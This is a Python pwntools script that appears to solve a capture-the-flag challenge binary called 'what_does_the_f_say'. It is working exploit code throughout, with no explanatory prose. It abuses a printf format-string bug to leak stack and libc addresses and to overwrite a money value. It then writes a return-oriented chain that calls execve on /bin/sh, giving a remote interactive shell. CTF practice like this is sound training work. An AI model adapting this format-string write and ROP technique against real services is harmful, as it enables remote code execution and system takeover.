#!/usr/bin/env python3

from pwn import *

DEBUG = False

def Main(ip=None, port=None):
    context.binary = "./what_does_the_f_say"

    if ip == None:
        local = True
    else:
        local = False

    if local:
        proc = process()
        # ~ GDB(proc)

    else:
        proc = remote(ip, int(port))

    proc.readuntil("2. Space food")
    input("rdy... press enter to start")

    MoreMoney(proc)

    # ~ DumpStack(proc, 50)
    ### 25 __libc_start_main_ret
    print("main_ret:", hex(ReadStackOffset(proc, 25)))

    Exploit(proc, local)

    proc.interactive()


def Exploit(proc, local):
    ### rsp at drinks_menu() ret
    rsp = ReadStackOffset(proc, 1) + 0x38
    prog_base = ReadStackOffset(proc, 15) - 0x174a

    print("ret_addr:", hex(prog_base + 0x174a))

    pop_rdi = prog_base + 0x18bb

    print("Writing pop rdi ptr:", hex(pop_rdi))
    ###put pop_rdi gadget on stack below fox_bar loop
    ###only write gadget's last 2 to rsp + 4 qwords because it happens to be fox_bar ret to main
    overwrite = "%{}p%10$hn".format( pop_rdi & 0xffff)
    overwrite += "\x00" * ( 16 - len(overwrite) )
    overwrite = overwrite.encode('latin-1')
    overwrite += p64(rsp + 4*8)
    ExploitWriteSequence(proc, overwrite)

    libc_start_main_ret = ReadStackOffset(proc, 25)


    if local:
        raise

    else:
        ### put remote addrs here
        libc_execve = libc_start_main_ret + 0xbf23d
        libc_bin_sh  = libc_start_main_ret + 0x1904f7





    print("Writing bin_sh ptr:", hex(libc_bin_sh))
    ### have to mask it off and write addr 2 bytes at a time because
    ### printf isn't gonna write GBs of whitespace at once, plus that would take forever
    ### write *bin_sh to rsp + 5 qwords, 2 bytes at a time
    for i, mask in enumerate([0xffff, 0xffff0000, 0xffff00000000, 0xffff000000000000]):
        n = libc_bin_sh & mask
        n = n >> i*16
        overwrite = "%{}p%10$hn".format(n)
        overwrite += "\x00" * ( 16 - len(overwrite) )
        overwrite = overwrite.encode('latin-1')
        overwrite += p64(rsp + 5*8 + i*2)
        ExploitWriteSequence(proc, overwrite)

    print("Writing execve ptr:", hex(libc_execve))
    ### write *system to rsp + 6 qwords, 2 bytes at a time
    for i, mask in enumerate([0xffff, 0xffff0000, 0xffff00000000]):
        n = libc_execve & mask
        n = n >> i*16
        overwrite = "%{}p%10$hn".format(n)
        overwrite += "\x00" * ( 16 - len(overwrite) )
        overwrite = overwrite.encode('latin-1')
        overwrite += p64(rsp + 6*8 + i*2)
        ExploitWriteSequence(proc, overwrite)

    pop3 = prog_base + 0x18b6
    print("Writing pop3 ptr to exec exploit", hex(pop3))
    ### overwrite ret last 2 to exec exploit
    overwrite = "%{}p%10$hn".format( pop3 & 0xffff)
    overwrite += "\x00" * ( 16 - len(overwrite) )
    overwrite = overwrite.encode('latin-1')
    overwrite += p64(rsp)
    ExploitWriteSequence(proc, overwrite, False)


def ReadStackOffset(proc, offset):
    exploit = "XXX%{}$p".format(offset)

    out = ExploitWriteSequence(proc, exploit).splitlines()

    for line in out:
        if line.startswith(b'XXX'):
            mem = line.strip(b'XXX')

            if mem == b'(nil)':
                return 0

            else:
                return int(mem, 16)

    raise Exception("Couldnt find mem output:", out)

def DumpStack(proc, length):
    for offset in list(range(1, length)):
        print( offset, hex(ReadStackOffset(proc, offset)) )


def MoreMoney(proc):
    print("Overwriting money")

    ### 15 is fox_bar+106
    money = ReadStackOffset(proc, 15) + 0x28c9

    if DEBUG:
        print("money addr:", hex(money))

    overwrite = b"%85p%10$hhn"
    overwrite += b"\x00" * ( 16 - len(overwrite) )
    overwrite += p64(money)

    ExploitWriteSequence(proc, overwrite)


def ExploitWriteSequence(proc, data, read_output=True):
    proc.clean()

    proc.writeline("1")

    if DEBUG:
        print("INPUT: 1")
        print("OUTPUT:", proc.read())

    proc.writeline("2")

    if DEBUG:
        print("INPUT: 2")
        print("OUTPUT:", proc.read())

    proc.clean()

    proc.writeline(data)

    if DEBUG:
        print("INPUT:", data)

    if read_output:
        output = proc.readuntil("2. Space food")

        if DEBUG:
            print("INPUT:", data)

        return output


def GDB(proc):
    sc = list()
    # ~ sc.append("break *drinks_menu+239")
    sc.append("break *drinks_menu+386")
    sc.append("continue")
    sc.append("")

    sc = '\n'.join(sc)

    gdb.attach(proc, sc)


if __name__ == "__main__":
    argv = sys.argv

    if len(argv) > 2:
        Main(argv[1], argv[2])

    else:
        Main()
